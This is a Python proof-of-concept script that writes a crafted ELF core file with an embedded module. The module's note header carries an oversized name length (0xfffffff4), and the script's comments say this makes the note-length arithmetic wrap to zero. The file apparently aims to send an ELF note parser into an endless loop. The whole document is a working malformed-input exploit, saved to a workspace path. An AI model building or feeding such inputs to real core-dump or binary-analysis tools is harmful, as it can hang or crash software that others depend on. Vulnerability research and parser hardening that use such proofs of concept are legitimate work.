import struct, os
PAGE=0x1000
MOD_OFF=0x1000
MOD_VADDR=0x400000
NOTE_OFF=0x200
# First note overflows len: 12 + 0xfffffff4 == 2^32, NOTE_ALIGN4 masks to 0.
N_NAMESZ=0xfffffff4
N_DESCSZ=0
N_TYPE=1
NOTE_SIZE=16
INNER_SIZE=NOTE_OFF+NOTE_SIZE
inner=bytearray(INNER_SIZE)
inner[0:16]=b'\x7fELF'+bytes([2,1,1,0])+b'\0'*8
struct.pack_into('<HHIQQQIHHHHHH', inner,16,3,62,1,0,64,0,0,64,56,2,0,0,0)
# PT_LOAD covers whole embedded object, PT_NOTE points at crafted note bytes.
struct.pack_into('<IIQQQQQQ', inner,64,1,5,0,0,0,INNER_SIZE,INNER_SIZE,PAGE)
struct.pack_into('<IIQQQQQQ', inner,64+56,4,4,NOTE_OFF,NOTE_OFF,0,NOTE_SIZE,NOTE_SIZE,4)
struct.pack_into('<III', inner,NOTE_OFF,N_NAMESZ,N_DESCSZ,N_TYPE)
inner[NOTE_OFF+12:NOTE_OFF+16]=b'LOOP'
# Outer ELF core has one PT_LOAD containing the embedded module at MOD_VADDR.
buf=bytearray(MOD_OFF+INNER_SIZE)
buf[0:16]=b'\x7fELF'+bytes([2,1,1,0])+b'\0'*8
struct.pack_into('<HHIQQQIHHHHHH', buf,16,4,62,1,0,64,0,0,64,56,1,0,0,0)
struct.pack_into('<IIQQQQQQ', buf,64,1,5,MOD_OFF,MOD_VADDR,0,INNER_SIZE,INNER_SIZE,PAGE)
buf[MOD_OFF:]=inner
open('/workspace/poc_note_len_wrap_loop','wb').write(buf)
print(len(buf), os.path.getsize('/workspace/poc_note_len_wrap_loop'))
